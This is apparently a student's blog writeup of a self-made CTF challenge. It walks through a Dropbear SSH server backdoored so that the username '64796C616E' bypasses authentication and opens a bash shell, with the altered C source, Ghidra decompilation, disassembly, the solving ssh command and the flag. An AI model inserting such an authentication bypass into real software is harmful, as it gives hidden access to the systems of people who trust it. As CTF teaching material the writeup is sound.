---
title: "Realistic Backdoor CTF Challenge"
date: "2025-04-6"
tags: ["reverse engineering", "malware", "backdoor"]
description: "My writeup on my self made CTF challenge"
---

# Inspiration for the challenge

I was tasked to create an original Capture The Flag challenge for the class, COMP:6970 CTF Practicum. Originally, I wanted to explore ideas in obfuscation and control flow manipulations to create a complex and difficult challenge. Eventually, I scrapped that idea and explored the idea of backdooring real software and asking users to find the backdoor to solve the CTF.

> **Try it yourself:** If you would like to try the challenge check out [this repository](#).
> 
> **Source code:** If you just want to see the source and everything that went into it, visit the [source repository](#).

---

# Actually building it

I immediately decided to host the CTF inside of a [**Docker image**](https://www.docker.com/) for ease of use. I originally planned to implement the backdoor into [openSSH](https://www.openssh.com/), but I settled on [**Dropbear**](https://matt.ucc.asn.au/dropbear/dropbear.html). Here is the backdoored code:

```c
static int checkusername(const char *username, unsigned int userlen) {

	char* listshell = NULL;
	char* usershell = NULL;
	uid_t uid;

	if (strcmp(username, "64796C616E") == 0)
	{
		dropbear_log(LOG_NOTICE, "Backdoor triggered");
		ses.authstate.pw_name = m_strdup("ctf");
		ses.authstate.pw_dir = m_strdup("/home/ctf");
		ses.authstate.pw_shell = m_strdup("/bin/bash");
		ses.authstate.pw_uid = 1001;
		ses.authstate.pw_gid = 1001;

		send_msg_userauth_success();
		ses.authstate.authdone = 1;
		return DROPBEAR_SUCCESS;
	}
```

Let's examine the backdoor in [Ghidra](https://ghidra-sre.org/) and see what the decomp might look like.

Heavily edited to show the important parts:

```c 
void recv_msg_userauth_request(void)
  iVar3 = strcmp(__s1,"64796C616E");
  if (iVar3 != 0) {
	normal logic...
  }

  dropbear_log(5,"Backdoor triggered");
  DAT_00146948 = (char *)m_strdup(&DAT_001355fb);
  DAT_00146938 = m_strdup(&DAT_001355f5);
  DAT_00146940 = (char *)m_strdup("/bin/bash");
  _DAT_00146930 = 0x3e9000003e9;
  send_msg_userauth_success();
  DAT_00146910 = 1;
```

Alright! That looks fairly straightforward. I wasn't looking to make this super challenging - with a simple string search or diffing, this section is easily spottable.

Now that the challenge binary is set up, I moved it to run on a [Digital Ocean](https://www.digitalocean.com/) droplet so that people can access it, but not have the ability to cheat by looking in the Docker image.

The actual solution looks like this:

```bash
ssh -p 2222 64796C616E@165.227.115.29
dispatch_protocol_error: type 51 seq 3
ctf@7da3577ac2bb:~$ cat flag.txt
flag{b4ckd00r3d_s3rv3r_w4s_c0mpr0m1s3d}
```

Nice and simple. Since I did not want to host all of the infrastructure, I created a small binary to handle flag checking, instructions, and hints.

![CTF Runner Binary](/writeups/custom/ctf_runner.png)

<p align="center"><em>The CTF runner binary provides instructions, flag checking, and hints.</em></p>



---

# Intended Solution - Mock Writeup

## Summarized Solution
1. Investigate [strings](https://linux.die.net/man/1/strings) and find the backdoor string
2. Analyze the binary using [Ghidra](https://ghidra-sre.org/) to locate the backdoor string
3. Identify the function `recv_msg_userauth_request` where the string is used
4. Trace the [disassembly](https://en.wikipedia.org/wiki/Disassembler) to understand the backdoor logic
5. Use the hexadecimal string `"64796C616E"` as the username to trigger the backdoor

## Full Walkthrough

Upon downloading or pulling the CTF challenge, I was presented with two binaries and a readme.
	
![Directory Listing](/writeups/custom/ls_directory.png)

<p align="center"><em>The directory listing shows the binaries and the readme file.</em></p>



The readme contains the instructions to get started:

```bash
All of the instructions are in the ctf_runner binary. It has the description, 
instructions, flag checker, and hints. Just run it to get started!

If you are running on mac just run the following command to get started:
cd ctf_runner_src
go build .
./ctf_runner
```

### Understanding the Challenge

Run the ctf_runner binary as instructed - The description has important information such as the flag format, it is a reverse engineering challenge, and that there is a backdoor. 

![Challenge Description](/writeups/custom/slide1.png)

<p align="center"><em>The challenge description provides key details about what to look for.</em></p>



Clicking on the instructions yields:

![Challenge Instructions](/writeups/custom/instructions.png)

<p align="center"><em>Instructions for connecting to the challenge server.</em></p>



Looks like there is a server to connect to, let's try it.

![SSH Connection Attempt](/writeups/custom/ssh_connect.png)

<p align="center"><em>Initial connection attempt fails, as expected.</em></p>



### Reverse Engineering the Binary

Connection failed. It is now time to take a look at the binary that contains the backdoor. It is named [Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) and for those that are unfamiliar, it is an SSH service similar to [OpenSSH](https://www.openssh.com/).

The first thing I always check when looking at a binary is the [**strings**](https://linux.die.net/man/1/strings) command. In this case, Dropbear is a fairly large project resulting in a lot of strings that are irrelevant. [Grepping](https://linux.die.net/man/1/grep) for "backdoor" results in the string "Backdoor triggered". At this point there are multiple paths you could go down: [diffing](https://en.wikipedia.org/wiki/Diff), [dynamic analysis](https://en.wikipedia.org/wiki/Dynamic_program_analysis), but the easiest in this instance is just to do [static analysis](https://en.wikipedia.org/wiki/Static_program_analysis). Since Dropbear is a big enough program, I am going to look for where that string is used.

![String Search Result](/writeups/custom/string_backdoor.png)

<p align="center"><em>Finding the "Backdoor triggered" string in the binary.</em></p>



After searching using Ghidra's string finder, we can find the location of the string within the binary. Since this binary is not stripped, we can see that the string is used in the function `recv_msg_userauth_request`. With this, we can go find where this string is being used in the disassembly.

![Disassembly View](disassembly.png)

<p align="center"><em>Disassembly showing the backdoor comparison logic.</em></p>



From the above image, we can see that it does some type of string comparison with `"64796C616E"`. We can make an educated guess that the string has something to do with triggering the backdoor, but let's step back for a moment. The function that houses the backdoor may give us some context clues on what the string could be used for.

I went and found the original source code on Github and tried to see what this could be:
https://github.com/mkj/dropbear/blob/bd12a8611b3c838f1ed1d1c2cbaff2da1072a315/src/svr-auth.c#L73

If you look at the disassembly right above the hexadecimal comparison, you see three calls to `buffer_getstring()` which can also be seen in the source code.

Here is the disassembly:

![Buffer Getstring Calls](buf_getstring.png)

<p align="center"><em>Disassembly showing the buffer_getstring() calls.</em></p>



And here is the source:

```c
username = buf_getstring(ses.payload, &userlen);
servicename = buf_getstring(ses.payload, &servicelen);
methodname = buf_getstring(ses.payload, &methodlen);
```

### Finding the Backdoor Trigger

With this, we can trace the disassembly to figure out what is being compared.

First, it stores the username in RAX:

```asm
0011ab59  MOV RDI,[DAT_001467f8]             ; ses.payload
0011ab60  LEA RSI,[RSP + 0x18]               ; &userlen (local_50)
0011ab65  CALL buf_getstring                 ; returns pointer in RAX
```

It then stores it on the stack:

```asm
0011ab76  MOV [RSP], RAX                     ; local_68 = username
```

Eventually we hit the comparison triggering the backdoor:

```asm
LAB_0011abde:
0011abde  MOV RDI, [RSP]                     ; RDI = username
0011abe2  LEA RSI, [s_64796C616E_001355d7]   ; RSI = "64796C616E"
0011abe9  CALL strcmp                        ; strcmp(username, "64796C616E")
```

### Solving the Challenge

Let's now try the hexadecimal string as the username when connecting to the server mentioned in the instructions. Success!

![Challenge Solved](solved.png)

<p align="center"><em>Successfully triggering the backdoor and finding the flag.</em></p>